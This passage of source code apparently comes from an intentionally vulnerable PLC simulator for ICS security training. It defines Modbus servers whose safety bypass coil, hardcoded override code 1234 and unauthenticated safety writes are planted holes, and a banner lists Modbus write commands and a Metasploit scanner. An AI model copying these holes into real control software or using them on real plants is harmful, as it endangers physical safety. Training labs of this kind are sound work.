        if regs[2] != PLC3_STATE['heater1_power']:
            PLC3_STATE['heater1_power'] = max(0, min(100, regs[2]))
            log.info(f"External Modbus write: heater1_power = {regs[2]}")
        if regs[3] != PLC3_STATE['cooler1_power']:
            PLC3_STATE['cooler1_power'] = max(0, min(100, regs[3]))
            log.info(f"External Modbus write: cooler1_power = {regs[3]}")
        if regs[22] != PLC3_STATE['heater2_power']:
            PLC3_STATE['heater2_power'] = max(0, min(100, regs[22]))
            log.info(f"External Modbus write: heater2_power = {regs[22]}")
        if regs[23] != PLC3_STATE['cooler2_power']:
            PLC3_STATE['cooler2_power'] = max(0, min(100, regs[23]))
            log.info(f"External Modbus write: cooler2_power = {regs[23]}")
        if regs[42] != PLC3_STATE['heater3_power']:
            PLC3_STATE['heater3_power'] = max(0, min(100, regs[42]))
            log.info(f"External Modbus write: heater3_power = {regs[42]}")
        if regs[43] != PLC3_STATE['cooler3_power']:
            PLC3_STATE['cooler3_power'] = max(0, min(100, regs[43]))
            log.info(f"External Modbus write: cooler3_power = {regs[43]}")

    except Exception as e:
        log.error(f"Error reading registers: {e}")

def register_monitor():
    while True:
        try:
            read_modbus_registers()
            time.sleep(0.5)
        except Exception as e:
            log.error(f"Register monitor error: {e}")
            time.sleep(1)

def shared_state_monitor():
    """Monitor shared state for web interface changes"""
    while True:
        try:
            state = shared_state.load_state()
            keys_to_monitor = [
                'heater1_status', 'heater2_status', 'heater3_status',
                'cooler1_status', 'cooler2_status', 'cooler3_status',
                'heater1_power', 'heater2_power', 'heater3_power',
                'cooler1_power', 'cooler2_power', 'cooler3_power',
                'thermal_runaway'
            ]
            for key in keys_to_monitor:
                shared_key = f'plc3_{key}'
                if shared_key in state and state[shared_key] is not None:
                    if PLC3_STATE[key] != state[shared_key]:
                        log.info(f"Web interface change: {key} = {state[shared_key]}")
                        PLC3_STATE[key] = state[shared_key]
            time.sleep(0.3)
        except Exception as e:
            log.error(f"State monitor error: {e}")
            time.sleep(1)

# Initialize Modbus datastore
store = ModbusSlaveContext(
    di=ModbusSequentialDataBlock(0, [0]*100),
    co=ModbusSequentialDataBlock(0, [0]*100),
    hr=ModbusSequentialDataBlock(0, [0]*100),
    ir=ModbusSequentialDataBlock(0, [0]*100)
)

server_context = ModbusServerContext(slaves=store, single=True)

identity = ModbusDeviceIdentification()
identity.VendorName = 'VulnPLC'
identity.ProductCode = 'PLC-3'
identity.VendorUrl = 'http://github.com/vulnerable-plc'
identity.ProductName = 'Temperature Control PLC'
identity.ModelName = 'VulnPLC-3000-TEMP'
identity.MajorMinorRevision = '2.1.0'

if __name__ == '__main__':
    # Initialize shared state with PLC-3 defaults
    sync_state_to_shared()
    log.info("PLC-3 state initialized in shared storage")

    sim_thread = threading.Thread(target=process_simulation, daemon=True)
    sim_thread.start()

    monitor_thread = threading.Thread(target=register_monitor, daemon=True)
    monitor_thread.start()

    state_monitor_thread = threading.Thread(target=shared_state_monitor, daemon=True)
    state_monitor_thread.start()

    log.info("=" * 60)
    log.info("PLC-3: Temperature Control System - Modbus Server")
    log.info("=" * 60)
    log.info("Modbus TCP Port: 5504")
    log.info("=" * 60)
    log.info("Register Map:")
    log.info("  Holding Registers:")
    log.info("    0-3: Zone 1 (temp, setpoint, heater, cooler)")
    log.info("    20-23: Zone 2 (temp, setpoint, heater, cooler)")
    log.info("    40-43: Zone 3 (temp, setpoint, heater, cooler)")
    log.info("  Coils:")
    log.info("    0-2: Heater 1-3 ON/OFF")
    log.info("    3-5: Cooler 1-3 ON/OFF")
    log.info("    10: Thermal Runaway (DANGER)")
    log.info("=" * 60)
    log.info("VULNERABILITY NOTE:")
    log.info("  - Race condition in thermal runaway")
    log.info("  - No safety interlock verification")
    log.info("  - Vulnerable to firmware injection")
    log.info("=" * 60)

    try:
        StartTcpServer(server_context, identity=identity, address=("0.0.0.0", 5504))
    except KeyboardInterrupt:
        log.info("Shutting down PLC-3 Modbus server...")
    except Exception as e:
        log.error(f"Server error: {e}")



================================================================================
FILE: core/modbus_server4.py
================================================================================
#!/usr/bin/env python3
"""
PLC-4: Safety/Emergency Shutdown System - Modbus TCP Server
Port 5505

Simulates a critical safety system with emergency stops and interlocks
INTENTIONALLY VULNERABLE - For security testing only
Vulnerabilities: Weak authentication, timing attacks, safety bypass
"""

from pymodbus.server.sync import StartTcpServer
from pymodbus.device import ModbusDeviceIdentification
from pymodbus.datastore import ModbusSequentialDataBlock, ModbusSlaveContext, ModbusServerContext
import threading
import time
import random
import logging
import shared_state

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

shared_state.init_state()

# PLC-4 State - Safety/ESD System
PLC4_STATE = {
    'emergency_stop_1': False,
    'emergency_stop_2': False,
    'emergency_stop_3': False,
    'master_emergency_stop': False,
    'safety_interlock_1': True,        # True = safe
    'safety_interlock_2': True,
    'safety_interlock_3': True,
    'fire_detection_zone1': False,
    'fire_detection_zone2': False,
    'fire_detection_zone3': False,
    'gas_detection_zone1': False,
    'gas_detection_zone2': False,
    'gas_leak_detected': False,
    'fire_suppression_active': False,
    'evacuation_alarm': False,
    'safety_system_armed': True,
    'safety_bypass_mode': False,       # VULNERABILITY: Can be enabled
    'watchdog_enabled': True,
    'watchdog_counter': 0,
    'critical_alarm_count': 0,
    'safety_override_code': 0,         # VULNERABILITY: Can be guessed
    'last_safety_check': time.time(),
    'system_healthy': True,
}

def sync_state_to_shared():
    """Sync PLC-4 state to shared storage (calculated values only, not controls)"""
    calculated_keys = [
        'watchdog_counter', 'critical_alarm_count',
        'last_safety_check', 'system_healthy',
        'gas_leak_detected'
    ]
    for key in calculated_keys:
        if key in PLC4_STATE:
            shared_state.update_state(f'plc4_{key}', PLC4_STATE[key])

def sync_state_from_shared():
    state = shared_state.load_state()
    for key in PLC4_STATE.keys():
        shared_key = f'plc4_{key}'
        if shared_key in state and state[shared_key] is not None:
            PLC4_STATE[key] = state[shared_key]

def process_simulation():
    """Simulate safety system"""
    while True:
        try:
            # NOTE: Don't load state from shared - it would overwrite
            # control values set via web interface or Modbus
            # Control values come from register monitor thread only

            # Watchdog timer
            if PLC4_STATE['watchdog_enabled']:
                PLC4_STATE['watchdog_counter'] += 1
                if PLC4_STATE['watchdog_counter'] > 60:
                    log.warning("Watchdog timeout - safety system may have failed")
                    PLC4_STATE['system_healthy'] = False

            # Check for emergency conditions
            any_emergency = (
                PLC4_STATE['emergency_stop_1'] or
                PLC4_STATE['emergency_stop_2'] or
                PLC4_STATE['emergency_stop_3']
            )

            if any_emergency:
                PLC4_STATE['master_emergency_stop'] = True

            # Fire detection logic
            fire_detected = (
                PLC4_STATE['fire_detection_zone1'] or
                PLC4_STATE['fire_detection_zone2'] or
                PLC4_STATE['fire_detection_zone3']
            )

            if fire_detected:
                PLC4_STATE['evacuation_alarm'] = True
                PLC4_STATE['fire_suppression_active'] = True
                PLC4_STATE['master_emergency_stop'] = True

            # Gas leak detection
            gas_detected = (
                PLC4_STATE['gas_detection_zone1'] or
                PLC4_STATE['gas_detection_zone2']
            )

            if gas_detected:
                PLC4_STATE['gas_leak_detected'] = True
                PLC4_STATE['evacuation_alarm'] = True
                PLC4_STATE['master_emergency_stop'] = True

            # VULNERABILITY: Safety bypass mode disables all safety checks
            if PLC4_STATE['safety_bypass_mode']:
                log.warning("SAFETY BYPASS MODE ACTIVE - All safety interlocks disabled!")
                PLC4_STATE['safety_interlock_1'] = True
                PLC4_STATE['safety_interlock_2'] = True
                PLC4_STATE['safety_interlock_3'] = True
                # Don't trigger alarms in bypass mode
                PLC4_STATE['master_emergency_stop'] = False

            # Count critical alarms
            PLC4_STATE['critical_alarm_count'] = sum([
                PLC4_STATE['master_emergency_stop'],
                fire_detected,
                gas_detected,
            ])

            # Update last safety check timestamp
            PLC4_STATE['last_safety_check'] = time.time()

            sync_state_to_shared()
            update_modbus_registers()

            time.sleep(1)
        except Exception as e:
            log.error(f"Process simulation error: {e}")
            time.sleep(1)

def update_modbus_registers():
    try:
        context = server_context[0]

        # Coils - Digital outputs
        context.setValues(1, 0, [PLC4_STATE['emergency_stop_1']])
        context.setValues(1, 1, [PLC4_STATE['emergency_stop_2']])
        context.setValues(1, 2, [PLC4_STATE['emergency_stop_3']])
        context.setValues(1, 3, [PLC4_STATE['master_emergency_stop']])
        context.setValues(1, 10, [PLC4_STATE['safety_interlock_1']])
        context.setValues(1, 11, [PLC4_STATE['safety_interlock_2']])
        context.setValues(1, 12, [PLC4_STATE['safety_interlock_3']])
        context.setValues(1, 20, [PLC4_STATE['fire_detection_zone1']])
        context.setValues(1, 21, [PLC4_STATE['fire_detection_zone2']])
        context.setValues(1, 22, [PLC4_STATE['fire_detection_zone3']])
        context.setValues(1, 23, [PLC4_STATE['gas_detection_zone1']])
        context.setValues(1, 24, [PLC4_STATE['gas_detection_zone2']])
        context.setValues(1, 30, [PLC4_STATE['fire_suppression_active']])
        context.setValues(1, 31, [PLC4_STATE['evacuation_alarm']])
        context.setValues(1, 40, [PLC4_STATE['safety_bypass_mode']])
        context.setValues(1, 41, [PLC4_STATE['watchdog_enabled']])
        context.setValues(1, 42, [PLC4_STATE['system_healthy']])

        # Holding registers
        context.setValues(3, 0, [PLC4_STATE['critical_alarm_count']])
        context.setValues(3, 1, [PLC4_STATE['watchdog_counter']])
        context.setValues(3, 2, [PLC4_STATE['safety_override_code']])

        # Input registers (read-only status)
        context.setValues(4, 0, [int(PLC4_STATE['system_healthy'])])
        context.setValues(4, 1, [PLC4_STATE['critical_alarm_count']])
        context.setValues(4, 2, [int(time.time() - PLC4_STATE['last_safety_check'])])

    except Exception as e:
        log.error(f"Error updating registers: {e}")

def read_modbus_registers():
    """Read Modbus registers and update state ONLY if changed by external write"""
    try:
        context = server_context[0]

        # Read coils - only update if they differ from current state
        coils = context.getValues(1, 0, 50)
        if bool(coils[0]) != PLC4_STATE['emergency_stop_1']:
            PLC4_STATE['emergency_stop_1'] = bool(coils[0])
            log.info(f"External Modbus write: emergency_stop_1 = {coils[0]}")
        if bool(coils[1]) != PLC4_STATE['emergency_stop_2']:
            PLC4_STATE['emergency_stop_2'] = bool(coils[1])
            log.info(f"External Modbus write: emergency_stop_2 = {coils[1]}")
        if bool(coils[2]) != PLC4_STATE['emergency_stop_3']:
            PLC4_STATE['emergency_stop_3'] = bool(coils[2])
            log.info(f"External Modbus write: emergency_stop_3 = {coils[2]}")
        if bool(coils[3]) != PLC4_STATE['master_emergency_stop']:
            PLC4_STATE['master_emergency_stop'] = bool(coils[3])
            log.info(f"External Modbus write: master_emergency_stop = {coils[3]}")
        if bool(coils[10]) != PLC4_STATE['safety_interlock_1']:
            PLC4_STATE['safety_interlock_1'] = bool(coils[10])
            log.info(f"External Modbus write: safety_interlock_1 = {coils[10]}")
        if bool(coils[11]) != PLC4_STATE['safety_interlock_2']:
            PLC4_STATE['safety_interlock_2'] = bool(coils[11])
            log.info(f"External Modbus write: safety_interlock_2 = {coils[11]}")
        if bool(coils[12]) != PLC4_STATE['safety_interlock_3']:
            PLC4_STATE['safety_interlock_3'] = bool(coils[12])
            log.info(f"External Modbus write: safety_interlock_3 = {coils[12]}")
        if bool(coils[20]) != PLC4_STATE['fire_detection_zone1']:
            PLC4_STATE['fire_detection_zone1'] = bool(coils[20])
            log.info(f"External Modbus write: fire_detection_zone1 = {coils[20]}")
        if bool(coils[21]) != PLC4_STATE['fire_detection_zone2']:
            PLC4_STATE['fire_detection_zone2'] = bool(coils[21])
            log.info(f"External Modbus write: fire_detection_zone2 = {coils[21]}")
        if bool(coils[22]) != PLC4_STATE['fire_detection_zone3']:
            PLC4_STATE['fire_detection_zone3'] = bool(coils[22])
            log.info(f"External Modbus write: fire_detection_zone3 = {coils[22]}")
        if bool(coils[23]) != PLC4_STATE['gas_detection_zone1']:
            PLC4_STATE['gas_detection_zone1'] = bool(coils[23])
            log.info(f"External Modbus write: gas_detection_zone1 = {coils[23]}")
        if bool(coils[24]) != PLC4_STATE['gas_detection_zone2']:
            PLC4_STATE['gas_detection_zone2'] = bool(coils[24])
            log.info(f"External Modbus write: gas_detection_zone2 = {coils[24]}")
        if bool(coils[30]) != PLC4_STATE['fire_suppression_active']:
            PLC4_STATE['fire_suppression_active'] = bool(coils[30])
            log.info(f"External Modbus write: fire_suppression_active = {coils[30]}")
        if bool(coils[31]) != PLC4_STATE['evacuation_alarm']:
            PLC4_STATE['evacuation_alarm'] = bool(coils[31])
            log.info(f"External Modbus write: evacuation_alarm = {coils[31]}")
        if bool(coils[40]) != PLC4_STATE['safety_bypass_mode']:
            PLC4_STATE['safety_bypass_mode'] = bool(coils[40])
            log.info(f"External Modbus write: safety_bypass_mode = {coils[40]}")
        if bool(coils[41]) != PLC4_STATE['watchdog_enabled']:
            PLC4_STATE['watchdog_enabled'] = bool(coils[41])
            log.info(f"External Modbus write: watchdog_enabled = {coils[41]}")

        # Read holding registers - only update if changed
        regs = context.getValues(3, 0, 10)
        if regs[2] != PLC4_STATE['safety_override_code']:
            PLC4_STATE['safety_override_code'] = regs[2]
            log.info(f"External Modbus write: safety_override_code = {regs[2]}")
            # Reset watchdog if code matches
            if PLC4_STATE['safety_override_code'] == 1234:  # VULNERABILITY: Weak code
                PLC4_STATE['watchdog_counter'] = 0
                log.info("Watchdog counter reset via override code")

    except Exception as e:
        log.error(f"Error reading registers: {e}")

def register_monitor():
    while True:
        try:
            read_modbus_registers()
            time.sleep(0.5)
        except Exception as e:
            log.error(f"Register monitor error: {e}")
            time.sleep(1)

def shared_state_monitor():
    """Monitor shared state for web interface changes"""
    while True:
        try:
            state = shared_state.load_state()
            keys_to_monitor = [
                'emergency_stop_1', 'emergency_stop_2', 'emergency_stop_3',
                'master_emergency_stop', 'safety_interlock_1', 'safety_interlock_2', 'safety_interlock_3',
                'fire_detection_zone1', 'fire_detection_zone2', 'fire_detection_zone3',
                'gas_detection_zone1', 'gas_detection_zone2',
                'fire_suppression_active', 'evacuation_alarm',
                'safety_bypass_mode', 'watchdog_enabled'
            ]
            for key in keys_to_monitor:
                shared_key = f'plc4_{key}'
                if shared_key in state and state[shared_key] is not None:
                    if PLC4_STATE[key] != state[shared_key]:
                        log.info(f"Web interface change: {key} = {state[shared_key]}")
                        PLC4_STATE[key] = state[shared_key]
            time.sleep(0.3)
        except Exception as e:
            log.error(f"State monitor error: {e}")
            time.sleep(1)

# Initialize Modbus datastore
store = ModbusSlaveContext(
    di=ModbusSequentialDataBlock(0, [0]*100),
    co=ModbusSequentialDataBlock(0, [0]*100),
    hr=ModbusSequentialDataBlock(0, [0]*100),
    ir=ModbusSequentialDataBlock(0, [0]*100)
)

server_context = ModbusServerContext(slaves=store, single=True)

identity = ModbusDeviceIdentification()
identity.VendorName = 'VulnPLC'
identity.ProductCode = 'PLC-4'
identity.VendorUrl = 'http://github.com/vulnerable-plc'
identity.ProductName = 'Safety/ESD PLC'
identity.ModelName = 'VulnPLC-4000-ESD'
identity.MajorMinorRevision = '3.0.1'

if __name__ == '__main__':
    # Initialize shared state with PLC-4 defaults
    sync_state_to_shared()
    log.info("PLC-4 state initialized in shared storage")

    sim_thread = threading.Thread(target=process_simulation, daemon=True)
    sim_thread.start()

    monitor_thread = threading.Thread(target=register_monitor, daemon=True)
    monitor_thread.start()

    state_monitor_thread = threading.Thread(target=shared_state_monitor, daemon=True)
    state_monitor_thread.start()

    log.info("=" * 60)
    log.info("PLC-4: Safety/Emergency Shutdown System - Modbus Server")
    log.info("=" * 60)
    log.info("Modbus TCP Port: 5505")
    log.info("=" * 60)
    log.info("Register Map:")
    log.info("  Coils:")
    log.info("    0-3: Emergency Stops")
    log.info("    10-12: Safety Interlocks")
    log.info("    20-22: Fire Detection Zones")
    log.info("    23-24: Gas Detection Zones")
    log.info("    30-31: Fire Suppression & Evacuation")
    log.info("    40: Safety Bypass Mode (DANGEROUS!)")
    log.info("    41: Watchdog Enable")
    log.info("    42: System Health")
    log.info("  Holding Registers:")
    log.info("    0: Critical Alarm Count")
    log.info("    1: Watchdog Counter")
    log.info("    2: Safety Override Code (1234 = reset)")
    log.info("  Input Registers:")
    log.info("    0: System Healthy (0/1)")
    log.info("    1: Critical Alarm Count")
    log.info("    2: Time Since Last Safety Check")
    log.info("=" * 60)
    log.info("CRITICAL VULNERABILITIES:")
    log.info("  - Safety bypass can be enabled via Modbus")
    log.info("  - Weak override code (1234)")
    log.info("  - No authentication on safety-critical functions")
    log.info("  - Watchdog can be disabled remotely")
    log.info("  - Timing attacks possible on authentication")
    log.info("=" * 60)

    try:
        StartTcpServer(server_context, identity=identity, address=("0.0.0.0", 5505))
    except KeyboardInterrupt:
        log.info("Shutting down PLC-4 Modbus server...")
    except Exception as e:
        log.error(f"Server error: {e}")



================================================================================
FILE: core/modbus_server.py
================================================================================
#!/usr/bin/env python3
"""
Modbus TCP Server for Vulnerable PLC Simulator
Implements standard Modbus protocol on port 5502
Syncs with web interface via shared state
"""

try:
    from pymodbus.server.sync import StartTcpServer
    from pymodbus.device import ModbusDeviceIdentification
    from pymodbus.datastore import ModbusSequentialDataBlock, ModbusSlaveContext, ModbusServerContext
    from pymodbus.datastore import ModbusSparseDataBlock
except ImportError:
    print("pymodbus not installed. Run: pip install pymodbus==2.5.3")
    exit(1)

import threading
import time
import random
import shared_state

class SyncedDataBlock(ModbusSequentialDataBlock):
    """Custom data block that syncs with shared state"""

    def __init__(self, address, values, is_coil=False):
        super().__init__(address, values)
        self.is_coil = is_coil

    def setValues(self, address, values):
        """Override to sync changes to shared state (Task 2: use unified helpers)"""
        super().setValues(address, values)

        # Update shared state when registers/coils are written
        for i, value in enumerate(values):
            reg_addr = address + i

            if self.is_coil:
                # Task 2: Use unified helper for consistency
                shared_state.set_coil(reg_addr, value)
                print(f"[Modbus] Coil {reg_addr} = {value}")
            else:
                # Task 2: Use unified helper for consistency
                shared_state.set_register(reg_addr, value)
                print(f"[Modbus] Register {reg_addr} = {value}")

class ModbusPLCServer:
    def __init__(self, host='0.0.0.0', port=5502):
        self.host = host
        self.port = port
        self.context = None

        # Initialize shared state
        shared_state.init_state()

    def initialize_data_store(self):
        """Initialize Modbus data store with values from shared state"""

        # Initialize holding registers from shared state (Task 2: use helpers)
        hr_values = [0] * 100
        for reg in range(100):
            hr_values[reg] = shared_state.get_register(reg)

        # Initialize coils from shared state (Task 2: use helpers)
        coil_values = [0] * 100
        for coil in range(100):
            coil_values[coil] = shared_state.get_coil(coil)

        # Create data blocks with syncing
        store = ModbusSlaveContext(
            di=ModbusSequentialDataBlock(0, [0] * 100),  # Discrete inputs (read-only)
            co=SyncedDataBlock(0, coil_values, is_coil=True),  # Coils (synced)
            hr=SyncedDataBlock(0, hr_values, is_coil=False),  # Holding registers (synced)
            ir=ModbusSequentialDataBlock(0, [0] * 100)  # Input registers (read-only, simulated)
        )

        self.context = ModbusServerContext(slaves=store, single=True)

        # Start background threads
        threading.Thread(target=self.sync_state_to_modbus, daemon=True).start()
        threading.Thread(target=self.simulate_sensors, daemon=True).start()

    def sync_state_to_modbus(self):
        """Periodically sync shared state to Modbus registers"""
        while True:
            try:
                time.sleep(1)  # Sync every second

                slave_id = 0x00
                state = shared_state.load_state()

                # Update holding registers from state (Task 2: use helpers)
                # Use parent class setValues to bypass SyncedDataBlock override (prevents feedback loop)
                for reg in range(20):  # Only update mapped registers
                    value = shared_state.get_register(reg)
                    ModbusSequentialDataBlock.setValues(self.context[slave_id].store['h'], reg, [value])

                # Update coils from state (Task 2: use helpers)
                # Use parent class setValues to bypass SyncedDataBlock override (prevents feedback loop)
                for coil in range(15):  # Only update mapped coils
                    value = shared_state.get_coil(coil)
                    ModbusSequentialDataBlock.setValues(self.context[slave_id].store['c'], coil, [value])

            except Exception as e:
                print(f"Sync error: {e}")
                time.sleep(5)

    def simulate_sensors(self):
        """Simulate sensor readings (input registers)"""
        while True:
            try:
                time.sleep(2)

                slave_id = 0x00
                state = shared_state.load_state()

                # Read-only input registers that mirror current state
                # These simulate real sensor readings
                values = [
                    int(state.get('tank1_level', 50) * 10),
                    int(state.get('tank1_temp', 25) * 10),
                    int(state.get('tank1_pressure', 101) * 10),
                    int(state.get('flow_rate', 15) * 10),
                    int(state.get('vibration', 2) * 10),
                    state.get('pump1_speed', 1500),
                    1 if state.get('pump1_status', False) else 0,
                    1 if state.get('emergency_stop', False) else 0,
                ]

                self.context[slave_id].setValues(4, 0, values)

            except Exception as e:
                print(f"Sensor simulation error: {e}")
                time.sleep(5)

    def start(self):
        """Start the Modbus TCP server"""
        self.initialize_data_store()

        # Configure device identification
        identity = ModbusDeviceIdentification()
        identity.VendorName = 'VulnPLC Inc.'
        identity.ProductCode = 'VulnPLC-3000'
        identity.VendorUrl = 'http://localhost:5000'
        identity.ProductName = 'Vulnerable PLC Simulator'
        identity.ModelName = 'VulnPLC-3000'
        identity.MajorMinorRevision = '1.0.0'

        print(f"""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘  Modbus TCP Server Starting (Synced Mode)                 â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    Modbus TCP Server: {self.host}:{self.port}
    Device: VulnPLC-3000
    State File: {shared_state.STATE_FILE}

    REGISTER MAPPING (Holding Registers - FC 3/6/16):
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    0  = Tank 1 Level (scaled x10: 500 = 50.0%)
    1  = Tank 1 Temperature (scaled x10: 250 = 25.0Â°C)
    2  = Tank 1 Pressure (scaled x10: 1013 = 101.3 kPa)
    3  = Tank 2 Level
    4  = Tank 2 Temperature
    5  = Tank 2 Pressure
    6  = Pump 1 Speed (RPM)
    7  = Pump 2 Speed (RPM)
    14 = Flow Rate (scaled x10)
    15 = Vibration (scaled x10)

    COIL MAPPING (Coils - FC 1/5/15):
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    0  = Pump 1 Status (ON/OFF)
    1  = Pump 2 Status
    2  = Pump 3 Status
    3  = Valve 1 Status
    4  = Valve 2 Status
    10 = Emergency Stop
    11 = Safety Interlock

    TEST COMMANDS:
    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Read tank level
    sudo modbus 127.0.0.1:5502 read 0 1

    # Set tank level to 80%
    sudo modbus 127.0.0.1:5502 write 0 800

    # Turn on pump 1
    sudo modbus 127.0.0.1:5502 write -t 0 0 1

    # Read multiple registers
    sudo modbus 127.0.0.1:5502 read 0 10

    # Metasploit scanner
    use auxiliary/scanner/scada/modbusclient
    set RHOSTS localhost
    set RPORT 5502
    run

    Changes via Modbus will appear in real-time on the HMI!
    Press Ctrl+C to stop
        """)

        try:
            StartTcpServer(
                self.context,
                identity=identity,
                address=(self.host, self.port)
            )
        except KeyboardInterrupt:
            print("\nShutting down Modbus server...")
        except Exception as e:
            print(f"Error starting Modbus server: {e}")

if __name__ == '__main__':
    server = ModbusPLCServer(host='0.0.0.0', port=5502)
    server.start()



================================================================================
FILE: core/physical_process.py
================================================================================
#!/usr/bin/env python3
"""
Physical Process Simulator
Realistic simulation of industrial processes with physics-based calculations

Simulates:
- Tank level dynamics (inflow/outflow)
- Pressure systems (compression, relief)
- Temperature control (heating/cooling)
- Flow rates and valve positions
- Safety interlocks and consequences
"""

import time
import threading
import logging
import math
from dataclasses import dataclass
from typing import Dict, Optional
import shared_state

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


@dataclass
class PhysicalState:
    """Current state of physical process"""
    timestamp: float
    tank_level: float  # % (0-100)
    pressure: float  # PSI
    temperature: float  # Celsius
    flow_rate: float  # GPM
    valve_position: float  # % (0-100)
    pump_running: bool
    alarm_state: str  # NORMAL, WARNING, ALARM, EMERGENCY


class TankSystem:
    """
    Water tank with inflow and outflow

    Physics:
    - Level increases with pump inflow
    - Level decreases with valve outflow
    - Overflow if level > 100%
    - Pump cavitation if level < 5%
    """

    def __init__(self, capacity_gallons: float = 1000):
        self.capacity = capacity_gallons
        self.level_percent = 50.0  # Start at 50%
        self.pump_inflow_rate = 50.0  # GPM when pump is on
        self.valve_outflow_base = 30.0  # GPM base rate
        self.overflow = False
        self.cavitation = False

    def update(self, dt: float, pump_on: bool, valve_open_percent: float):
        """Update tank level based on pump and valve states"""
        # Calculate inflow
        inflow = self.pump_inflow_rate if pump_on else 0.0

        # Calculate outflow (proportional to valve position and level)
        # Flow increases with level due to pressure
        level_factor = math.sqrt(max(0.1, self.level_percent / 100.0))
        outflow = self.valve_outflow_base * (valve_open_percent / 100.0) * level_factor

        # Net flow
        net_flow = inflow - outflow

        # Update level (convert flow to percentage)
        level_change = (net_flow / self.capacity) * 100.0 * dt
        self.level_percent += level_change

        # Check constraints
        if self.level_percent > 100.0:
            self.level_percent = 100.0
            self.overflow = True
            log.error("ðŸš¨ TANK OVERFLOW! Level: 100%")
        else:
            self.overflow = False

        if self.level_percent < 5.0 and pump_on:
            self.cavitation = True
            log.error("ðŸš¨ PUMP CAVITATION! Level: <5%")
        else:
            self.cavitation = False

        if self.level_percent < 0.0:
            self.level_percent = 0.0

        return {
            'level': self.level_percent,
            'inflow': inflow,
            'outflow': outflow,
            'overflow': self.overflow,
            'cavitation': self.cavitation
        }


class PressureSystem:
    """
    Compressed air/gas system

    Physics:
    - Pressure increases with compressor operation
    - Pressure decreases with usage/leaks
    - Relief valve opens at high pressure
    - Vessel rupture if pressure exceeds design limit
    """

    def __init__(self, max_pressure_psi: float = 150):
        self.pressure = 80.0  # PSI - start at normal operating pressure
        self.max_pressure = max_pressure_psi
        self.compressor_rate = 10.0  # PSI/sec when compressor running
        self.leak_rate = 2.0  # PSI/sec baseline leak
        self.relief_valve_setpoint = 120.0  # PSI
        self.relief_valve_open = False
        self.rupture = False

    def update(self, dt: float, compressor_on: bool, relief_valve_forced: bool = False):
        """Update pressure based on compressor and relief valve"""
        # Compressor input
        if compressor_on:
            self.pressure += self.compressor_rate * dt

        # Baseline leakage
        self.pressure -= self.leak_rate * dt

        # Relief valve (automatic or forced)
        if relief_valve_forced or self.pressure >= self.relief_valve_setpoint:
            self.relief_valve_open = True
            relief_rate = 15.0  # PSI/sec when relief valve open
            self.pressure -= relief_rate * dt
        else:
            self.relief_valve_open = False

        # Check for rupture
        if self.pressure > self.max_pressure:
            self.rupture = True
            self.pressure = 0.0  # Catastrophic failure
            log.error(f"ðŸš¨ðŸš¨ðŸš¨ VESSEL RUPTURE! Pressure exceeded {self.max_pressure} PSI")

        # Constraints
        if self.pressure < 0:
            self.pressure = 0.0

        return {
            'pressure': self.pressure,
            'relief_valve_open': self.relief_valve_open,
            'rupture': self.rupture,
            'alarm': 'CRITICAL' if self.rupture else ('HIGH' if self.pressure > 130 else 'NORMAL')
        }


class TemperatureSystem:
    """
    Temperature control system (furnace/reactor)

    Physics:
    - Temperature increases with heater operation
    - Temperature decreases with cooling and ambient loss
    - Thermal runaway if cooling fails
    - Material damage at high temperatures
    """

    def __init__(self, ambient_temp: float = 20.0):
        self.temperature = ambient_temp
        self.ambient = ambient_temp
        self.heater_rate = 5.0  # Â°C/sec when heater on
        self.cooling_rate = 3.0  # Â°C/sec when cooling on
        self.ambient_loss_rate = 0.5  # Â°C/sec heat loss to environment
        self.max_safe_temp = 200.0  # Â°C
        self.damage_temp = 250.0  # Â°C - material damage
        self.thermal_runaway = False
        self.damage = False

    def update(self, dt: float, heater_on: bool, cooling_on: bool):
        """Update temperature based on heater and cooling"""
        # Heater input
        if heater_on:
            self.temperature += self.heater_rate * dt

        # Active cooling
        if cooling_on:
            self.temperature -= self.cooling_rate * dt

        # Ambient heat loss (proportional to temp difference)
        temp_diff = self.temperature - self.ambient
        if temp_diff > 0:
            loss = self.ambient_loss_rate * (temp_diff / 100.0) * dt
            self.temperature -= loss

        # Check for thermal runaway (heater on, no cooling, high temp)
        if heater_on and not cooling_on and self.temperature > 150:
            self.thermal_runaway = True
            log.error(f"ðŸš¨ THERMAL RUNAWAY! Temp: {self.temperature:.1f}Â°C")
        else:
            self.thermal_runaway = False

        # Check for damage
        if self.temperature > self.damage_temp:
            self.damage = True
            log.error(f"ðŸš¨ðŸš¨ EQUIPMENT DAMAGE! Temp: {self.temperature:.1f}Â°C exceeds {self.damage_temp}Â°C")

        # Constraints
        if self.temperature < self.ambient:
            self.temperature = self.ambient

        return {
            'temperature': self.temperature,
            'thermal_runaway': self.thermal_runaway,
            'damage': self.damage,
            'alarm': 'CRITICAL' if self.damage else ('HIGH' if self.temperature > self.max_safe_temp else 'NORMAL')
        }


class SafetySystem:
    """
    Emergency shutdown and safety interlock system

